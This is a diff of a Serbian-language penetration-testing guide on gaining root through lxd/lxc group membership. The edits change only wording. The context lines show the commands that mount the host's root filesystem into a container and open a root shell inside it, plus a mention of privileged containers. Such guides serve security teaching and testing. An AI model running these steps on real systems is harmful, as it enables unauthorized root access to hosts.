@@ -9,7 +9,7 @@ Ako pripadate _**lxd**_ **ili** _**lxc**_ **grupi**, možete postati root
 ### Metoda 1
 
 Možete preuzeti alpine sliku za korišćenje sa lxd iz pouzdane biblioteke.  
-Canonical objavljuje dnevne verzije na njihovom sajtu: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+Canonical objavljuje dnevne verzije na svojoj stranici: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
 Samo preuzmite **lxd.tar.xz** i **rootfs.squashfs** iz najnovije verzije. (Ime direktorijuma je datum).
 
 Alternativno, možete instalirati na vašem računaru ovaj distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (pratite uputstva sa github-a):
@@ -51,7 +51,7 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Ako naiđete na ovu grešku _**Greška: Nema pronađenog skladišnog prostora. Molimo kreirajte novi skladišni prostor**_\
+> Ako pronađete ovu grešku _**Greška: Nema pronađenog skladišnog prostora. Molimo kreirajte novi skladišni prostor**_\
 > Pokrenite **`lxd init`** i postavite sve opcije na podrazumevane. Zatim **ponovite** prethodni deo komandi
 
 Na kraju možete izvršiti kontejner i dobiti root:
@@ -60,7 +60,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Metoda 2
+### Metod 2
 
 Izgradite Alpine sliku i pokrenite je koristeći flag `security.privileged=true`, prisiljavajući kontejner da komunicira kao root sa host datotečnim sistemom.
 ```bash
